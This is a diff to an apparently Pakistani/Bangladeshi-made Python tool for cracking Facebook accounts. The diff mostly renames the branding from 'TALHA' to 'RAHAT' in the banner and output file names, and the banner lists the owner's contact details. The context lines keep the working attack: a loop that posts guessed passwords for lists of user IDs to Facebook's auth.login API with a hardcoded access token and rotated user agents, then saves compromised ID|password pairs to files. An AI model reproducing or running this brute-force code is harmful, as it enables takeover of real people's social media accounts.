@@ -309,7 +309,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ TALHA ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ RAHAT ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -389,23 +389,23 @@ def follow(ses,coki):
 
 logo = ("""\033[1;32m
        
-888b            d888	8888888b.				   Y88b         d88P
-8888b       d8888	888        Y88b		  	   Y88b    d88P
-88888b..d88888	888    	    888                   Y88o88P
-888Y88888P888	888    	 d88P 			 	    Y888P
-888   Y888P  888	8888888P" 					 	 d888b
-888     Y8P     888	888    T88b				 		d88888b
-888        "        888	888       T88b				  d88P      Y88b
-888                  888   888            T88b   ✪  d88P               Y88b  \033
+
+
+
+
+					 	
+
+
+
 __________________×______________________
   
-  Owner   :  Mohammad Rahat
+OWNER  : MOHAMMAD RAHAT
  
-  Github   :  NotFinderror404
+GITHUB : NOTFINDERROR404
 
-  Facebook : M.Rahat404
+FCEBOOK: M.RAHAT404
   
-  Whatsapp : +8801870221390
+WHATSAPP : +8801870221390
 __________________×______________________\033[1;37m""")
 
 class Main:
@@ -859,7 +859,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ TALHA ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ RAHAT ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -876,15 +876,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ TALHA-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ RAHAT-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-TALHA-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-RAHAT-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ TALHA-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ RAHAT-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-TALHA-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-RAHAT-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1309,9 +1309,9 @@ class Main:
 				open("2009-TALHA-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ TALHA-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ RAHAT-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-TALHA-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-RAHAT-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
